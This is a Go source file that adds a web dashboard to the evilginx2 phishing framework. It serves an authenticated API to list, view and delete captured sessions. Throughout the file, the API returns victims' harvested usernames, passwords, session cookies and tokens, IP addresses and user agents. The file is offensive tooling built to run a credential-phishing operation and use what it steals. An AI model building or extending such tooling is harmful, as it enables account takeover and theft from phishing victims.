package dashboard

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

//go:embed index.html
var indexHTML string

type Dashboard struct {
	db        *database.Database
	authToken string
	port      int
	srv       *http.Server
}

type apiSession struct {
	Id           int                                    `json:"id"`
	Phishlet     string                                 `json:"phishlet"`
	LandingURL   string                                 `json:"landing_url"`
	Username     string                                 `json:"username"`
	Password     string                                 `json:"password"`
	Custom       map[string]string                      `json:"custom"`
	BodyTokens   map[string]string                      `json:"body_tokens"`
	HttpTokens   map[string]string                      `json:"http_tokens"`
	CookieTokens map[string]map[string]*cookieTokenItem `json:"tokens"`
	SessionId    string                                 `json:"session_id"`
	UserAgent    string                                 `json:"useragent"`
	RemoteAddr   string                                 `json:"remote_addr"`
	CreateTime   int64                                  `json:"create_time"`
	UpdateTime   int64                                  `json:"update_time"`
}

type cookieTokenItem struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"httpOnly"`
}

func New(db *database.Database, authToken string, port int) *Dashboard {
	return &Dashboard{
		db:        db,
		authToken: authToken,
		port:      port,
	}
}

func (d *Dashboard) Start() error {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/sessions", d.corsMiddleware(d.authMiddleware(d.handleSessions)))
	mux.HandleFunc("/api/sessions/", d.corsMiddleware(d.authMiddleware(d.handleSessionByID)))
	mux.HandleFunc("/", d.corsMiddleware(d.handleFrontend))

	d.srv = &http.Server{
		Handler:      mux,
		Addr:         fmt.Sprintf(":%d", d.port),
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	return d.srv.ListenAndServe()
}

func (d *Dashboard) Port() int {
	return d.port
}

func (d *Dashboard) AuthToken() string {
	return d.authToken
}

func (d *Dashboard) corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next(w, r)
	}
}

func (d *Dashboard) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if d.authToken != "" {
			token := r.URL.Query().Get("auth")
			if token == "" {
				token = r.Header.Get("X-Auth-Token")
			}
			if token != d.authToken {
				http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
				return
			}
		}
		next(w, r)
	}
}

func (d *Dashboard) handleFrontend(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	html := indexHTML
	if d.authToken != "" {
		html = replaceAuthToken(html, d.authToken)
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(html))
}

func replaceAuthToken(html, token string) string {
	return strings.ReplaceAll(html, "__AUTH_TOKEN__", token)
}

func (d *Dashboard) handleSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		sessions, err := d.db.ListSessions()
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}

		apiSessions := make([]apiSession, 0)
		for _, s := range sessions {
			apiSessions = append(apiSessions, dbSessionToAPI(s))
		}

		writeJSON(w, http.StatusOK, map[string]interface{}{"sessions": apiSessions})
		return
	}
	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (d *Dashboard) handleSessionByID(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Path[len("/api/sessions/"):]
	if idStr == "" {
		http.Error(w, `{"error":"missing session id"}`, http.StatusBadRequest)
		return
	}

	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, `{"error":"invalid session id"}`, http.StatusBadRequest)
		return
	}

	sessions, err := d.db.ListSessions()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	var found *database.Session
	for _, s := range sessions {
		if s.Id == id {
			found = s
			break
		}
	}

	if found == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
		return
	}

	switch r.Method {
	case "GET":
		writeJSON(w, http.StatusOK, dbSessionToAPI(found))
	case "DELETE":
		err := d.db.DeleteSessionById(id)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
	default:
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
	}
}

func dbSessionToAPI(s *database.Session) apiSession {
	ct := make(map[string]map[string]*cookieTokenItem)
	if s.CookieTokens != nil {
		for domain, tmap := range s.CookieTokens {
			ct[domain] = make(map[string]*cookieTokenItem)
			for k, v := range tmap {
				ct[domain][k] = &cookieTokenItem{
					Name:     v.Name,
					Value:    v.Value,
					Path:     v.Path,
					HttpOnly: v.HttpOnly,
				}
			}
		}
	}

	return apiSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: ct,
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
	}
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}
